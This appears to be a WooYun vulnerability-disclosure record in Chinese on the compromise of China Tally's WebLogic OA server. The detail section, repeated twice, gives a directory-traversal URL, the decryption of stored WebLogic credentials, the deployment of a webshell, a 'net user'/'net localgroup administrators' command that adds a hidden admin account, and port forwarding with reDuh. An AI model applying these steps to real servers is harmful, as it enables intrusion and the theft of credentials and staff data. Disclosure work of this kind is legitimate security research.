{"id": 82234, "wybug_id": "wooyun-2015-0151701", "wybug_title": "中联理货运维配置不当导致OA服务器沦陷危及内网安全", "wybug_corp": "中联理货", "wybug_author": "sanwenkit", "wybug_date": "2015-11-04 16:53", "wybug_open_date": "2015-12-21 17:54", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["目录遍历", "敏感信息泄露", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向公众公开  简要描述：     中联理货有限公司（CHINA TALLY）是按国务院关于深化港口体制改革的要求,经交通部批准成立的全国性理货总公司。　　公司致力于为广大客户提供满意的理货、丈量、计量、监装监卸、货损检定等服务。主要业务包括:件杂货船舶的理货业务、集装箱船舶的理箱业务、集装箱装拆箱理货业务、货物尺码丈量业务、散装货物计量业务、监装监卸业务和货损检定业务等。 详细说明：  企业门户http://**.**.**.**/OA办公自动化系统http://**.**.**.**:7001/defaultroot/login.jsp该门户站点存在Resin Windows远程目录遍历漏洞，访问如下URL即可遍例全盘文件。\nhttp://**.**.**.**/D:%5C/\n\n\n翻到了weblogic配置文件\nhttp://**.**.**.**/D:%5C/bea/user_projects/domains/bjzl/boot.properties\n\n\n这个加密的字符串是可以逆向破解的，利用以下脚本去解密\nhttps://**.**.**.**/NetSPI/WebLogicPasswordDecryptor\n跑出用户名admin，密码12345678\n\n找了一下，中联理货的OA办公系统在7001端口，正好是weblogic默认端口访问weblogic 后台管理页面\nhttp://**.**.**.**:7001/console/\n\n\n利用之前跑出来的用户名、密码尝试登录，直接登录成功。接着就是部署war上传webshell，这里发现服务器使用的是jrocket的jvm，很多jsp文件都会运行出错,部署的webshell需功能尽量简单。同时，发现前人留下的shell一枚。\nhttp://**.**.**.**:7001/qqq/index.jsp\n由于weblogic的权限很高，可以直接添加管理员帐户\nnet user $test123 $test123 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /addnet localgroup administrators $test123 /add\n利用reDuh做端口转发，reDuh地址\nhttp://**.**.**.**:7001/ezoa/reDuh.jsp\n最后登录服务器拍照留念\n\nOA系统里有中联理货在各地的管理员账号密码。\n\n以及内部员工信息\n\n\n\n数据都没有做任何修改，内网也没有看过，以上。   漏洞证明：  企业门户http://**.**.**.**/OA办公自动化系统http://**.**.**.**:7001/defaultroot/login.jsp该门户站点存在Resin Windows远程目录遍历漏洞，访问如下URL即可遍例全盘文件。\nhttp://**.**.**.**/D:%5C/\n\n\n翻到了weblogic配置文件\nhttp://**.**.**.**/D:%5C/bea/user_projects/domains/bjzl/boot.properties\n\n\n这个加密的字符串是可以逆向破解的，利用以下脚本去解密\nhttps://**.**.**.**/NetSPI/WebLogicPasswordDecryptor\n跑出用户名admin，密码12345678\n\n找了一下，中联理货的OA办公系统在7001端口，正好是weblogic默认端口访问weblogic 后台管理页面\nhttp://**.**.**.**:7001/console/\n\n\n利用之前跑出来的用户名、密码尝试登录，直接登录成功。接着就是部署war上传webshell，这里发现服务器使用的是jrocket的jvm，很多jsp文件都会运行出错,部署的webshell需功能尽量简单。同时，发现前人留下的shell一枚。\nhttp://**.**.**.**:7001/qqq/index.jsp\n由于weblogic的权限很高，可以直接添加管理员帐户\nnet user $test123 $test123 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /addnet localgroup administrators $test123 /add\n利用reDuh做端口转发，reDuh地址\nhttp://**.**.**.**:7001/ezoa/reDuh.jsp\n最后登录服务器拍照留念\n\nOA系统里有中联理货在各地的管理员账号密码。\n\n以及内部员工信息\n\n\n\n数据都没有做任何修改，内网也没有看过，以上。   修复方案：  加强运维管理，提高安全意识。   版权声明：转载请注明来源 sanwenkit@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-11-06 17:53 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}